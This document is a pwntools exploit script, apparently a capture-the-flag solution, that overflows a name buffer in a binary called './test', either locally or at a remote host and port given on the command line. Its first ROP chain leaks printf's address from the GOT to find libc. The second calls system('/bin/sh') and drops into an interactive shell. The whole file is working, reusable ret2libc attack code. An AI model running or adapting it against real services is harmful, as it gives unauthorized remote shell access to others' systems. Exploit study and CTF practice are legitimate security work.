#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './test'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = './libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
# gadget
prdi = 0x0000000000400823 # pop rdi ; ret
ret  = 0x000000000040055e # ret

# elf, libc
# main = 0x400769
# rop1
offset = 136-8
payload = '\0'*offset
payload += p64(elf.bss()+0x800)
payload += p64(prdi)+p64(elf.got['printf'])+p64(0x4006EE)+p64(0xdeadbeef)

sla('how long is your name: ','1000')
sla('and what\'s you name? ',payload)
ru('hello ')

printf = uu64(rc(14))
info_addr('printf',printf)
libcbase = printf - libc.sym['printf']
system = libcbase + libc.sym['system']
binsh = libcbase  + libc.search("/bin/sh").next()

offset = 136-8
pl2 = '\0'*offset
pl2 += p64(elf.bss()+0x800)
pl2 += p64(ret)+p64(prdi)+p64(binsh)+p64(system)+p64(0xdeadbeef)

debug()   
sl('1000')
sla('and what\'s you name? ',pl2)
# ru('hello ')

# log.warning('--------------')

p.interactive()

